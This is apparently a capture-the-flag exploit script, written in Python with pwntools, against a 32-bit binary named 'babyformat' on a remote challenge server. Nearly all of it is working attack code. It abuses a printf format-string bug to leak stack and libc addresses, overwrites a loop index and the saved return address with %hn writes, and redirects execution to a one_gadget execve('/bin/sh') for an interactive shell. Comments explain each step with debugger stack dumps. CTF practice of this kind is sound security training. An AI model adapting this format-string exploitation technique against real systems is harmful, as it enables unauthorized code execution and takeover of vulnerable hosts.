#!/usr/bin/env python
# encoding: utf-8
from pwn import *

# FILL binary and host, port
binary = './babyformat'
host, port = '104.196.99.62 2222'.split(' ')
port = int(port)

e = ELF(binary)
context.os = 'linux'
context.arch = e.arch

libc = ELF('./libc.so.6') # ubuntu 18.04 libc

if args['REMOTE']:
    p = remote(host, port)
elif args['GDB']:
    p = gdb.debug(binary, gdbscript='breakrva 0x8C4\nbreakrva 0x93B') #args['GDB'])
else:
    p = process(binary)

# TLDR: We have format printf bug so we can leak:
#  - memory from stack - e.g. %1$p %2$p etc
#  - memory from arbitrary address - e.g. pwn.p32(addr) + "%1$s" <-- but u have to remember this may segfault if addr is wrong and that the output always end with '\x00'
# We can also write to memory using %n, but bcoz our buffer is not on the stack itself,, sth like this wont work:
# 'aaaa' + p32(addr) + '%2$hhn'
#
# so we need to grab some pointer from the stack itself and use it.

"""
So when we print e.g. `%3$p` - it gives us 0x...8f2:

And `%15$p` gives us libc_start_main+XXX

Below u can see stack dump made with pwndbg (e.g. `stack 50` or `stack -10 50`)
(( I have added first column which is stack index ))

3 03:000c│      0xfffcafdc —▸ 0x566508f2 ◂— add    esp, 0x10
4 04:0010│      0xfffcafe0 —▸ 0x566509cc ◂— cmp    eax, 0x203d3d3d
5 05:0014│      0xfffcafe4 —▸ 0x56651fb4 ◂— 0x1ecc
6 06:0018│ ebp  0xfffcafe8 —▸ 0xfffcb008 ◂— 0x0
7 07:001c│      0xfffcafec —▸ 0x56650903 ◂— sub    esp, 4
8 08:0020│      0xfffcaff0 ◂— 0x1
9 09:0024│      0xfffcaff4 —▸ 0xfffcb0b4 —▸ 0xfffcceef ◂— './babyformat'
10 0a:0028│      0xfffcaff8 —▸ 0xfffcb0bc —▸ 0xfffccefc ◂— 'LESS=-R'
11 0b:002c│      0xfffcaffc ◂— 0x0
12 0c:0030│      0xfffcb000 —▸ 0xf7f519b0 ◂— push   ebp
13 0d:0034│      0xfffcb004 —▸ 0xfffcb020 ◂— 0x1
14 0e:0038│      0xfffcb008 ◂— 0x0
15 0f:003c│      0xfffcb00c —▸ 0xf7d3ce81 (__libc_start_main+241) ◂— add    esp, 0x10
"""

# To debug its good to use `breakrva 0x008C4` in pwndbg
# so we break just before `call printf(input)`

# Server has the same libc_start_main ending address at me
# e.g. 0xf7d59e81
# so it probably runs ubuntu 18.xx and we could use its libc?

### SOLVE PlAN:
# - leak ret addr
# - it seems my libc is the same as theirs (ubuntu 18.04)
# - overwrite retaddr to point to one gadget rce
###############################################################

# we need to leak stack/retaddr (so we can change it using %n)
# ebp or %8$p shows us stack address
# at an example gdb session it shows me: 0xff8a8828 address
# and this is just before ret addr from main:
"""
06:0018│ ebp  0xff8a8808 —▸ 0xff8a8828 ◂— 0x0
# ...
0e:0038│      0xff8a8828 ◂— 0x0
0f:003c│      0xff8a882c —▸ 0xf7dcae81 (__libc_start_main+241) ◂— add    esp, 0x10
"""

# Leaking retaddr addr
p.recvuntil('==== Baby Format - Echo system ====\n')
# Now program is in loop of printf(read(13))

p.send('%6$p %15$p')
sleep(0.5)
stack_addr, libc_start_main_end = p.recv().split(' ')

libc_start_main_end = int(libc_start_main_end, 16)
stack_addr = int(stack_addr, 16)
ret_addr = stack_addr+20

libc_base = libc_start_main_end - libc.functions['__libc_start_main'].address - 241

system = libc_base + libc.functions['system'].address 

print '__libc_start_main+241 = 0x%x' % libc_start_main_end
print 'Leaked stack addr     = 0x%x' % stack_addr
print 'Retaddr               = 0x%x' % ret_addr
print 'libc_base             = 0x%x' % libc_base
print 'system should be at   = 0x%x' % system

def send_payload(idx, bytes, fmt):
    payload = '%{}c%{}${}'.format(bytes, idx, fmt)
    payload += '.' * (13 - len(payload))
    print repr(payload), len(payload), 'bytes=0x%x' % bytes
    assert len(payload) <= 13
    p.send(payload)
    sleep(0.5)
    p.recv()

def write_2b_idx(idx, two_bytes):
    assert 0 <= two_bytes <= 0xffff
    send_payload(idx, two_bytes, 'hn')

def write_1b_idx(idx, byte):
    assert 0 <= byte <= 0xff
    send_payload(idx, byte, 'hhn')

# Going to change index in main so we get more printfs
# the index is stored in:
# 0b:002c│      0xffffcbec ◂— 0x0
# example retaddr:
# 13:004c│      0xffffcc0c —▸ 0xf7dd0e81 (__libc_start_main+241) ◂— add    esp, 0x10
loop_idx_addr = ret_addr - (0xffffcc0c - 0xffffcbec)
loop_idx_addr += 2
print 'loop idx last byte addr = 0x%x' % loop_idx_addr

# Lets use this:
# 09:0024│      0xffffcbe4 —▸ 0xffffcca4 —▸ 0xffffceef ◂— './babyformat'
# and make 0xffffcca4 point to loop index (0xffffcbec)
write_2b_idx(9, loop_idx_addr & 0xffff)

# So thx to this, the 0xffffcca4 points to loop idx addr and so we can use %n 
# with it to change the loop index in main
# 39:00e4│      0xffffcca4 —▸ 0xffffceef ◂— './babyformat'
write_2b_idx(0x39, 0xffff)

# now we have plenty of prints to do, so its ez to win


# 09:0024│      0xffffcbe4 —▸ 0xffffcca4 —▸ 0xffffceef ◂— './babyformat'
# lets change this -------------------------------^^^^ 4 bytes
# so this will point to retaddr and not the string
# then we can take:
# 39:00e4│      0xffffcca4 —▸ 0xffffceef ◂— './babyformat'
# and it will point to retaddr, so we can change last 2 bytes
# to jump to one gadget rce



"""
# one_gadget /libc.so.6   
0x3d0d3	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x3d0d5	execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL

0x3d0d9	execve("/bin/sh", esp+0x3c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x3c] == NULL

0x3d0e0	execve("/bin/sh", esp+0x40, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x40] == NULL

0x67a7f	execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x67a80	execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

0x137e5e	execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL

0x137e5f	execl("/bin/sh", [esp])
constraints:
  ebx is the GOT address of libc
  [esp] == NULL
"""


# Take one of the OneGadgetRCEs
one_gadget_rce = libc_base + 0x3d0e0

# other addresses I have tried for one gadget but they don't work: 0x3d0d9 #0x3d0d5 # 0x137e5f # 0x3d0d3
# (as some constraints above are not filled properly!)

# Lets set full ret address
#
print 'One gadget rce = 0x%x' % one_gadget_rce
p.send('.'*12 +'\n') # refresh
sleep(1)

# first, the last 2 bytes of retaddr
write_2b_idx(9, ret_addr & 0xffff)
# overwrite last 2 bytes of retaddr to the last 2 bytes of one gadget rce
write_2b_idx(0x39, one_gadget_rce & 0xffff)

write_2b_idx(9, (ret_addr+2) & 0xffff)
write_2b_idx(0x39, one_gadget_rce >> 16)

#### Set back loop counter/index so we can leave/return from main
write_2b_idx(9, loop_idx_addr & 0xffff)
write_2b_idx(0x39, 0x0)

p.interactive()


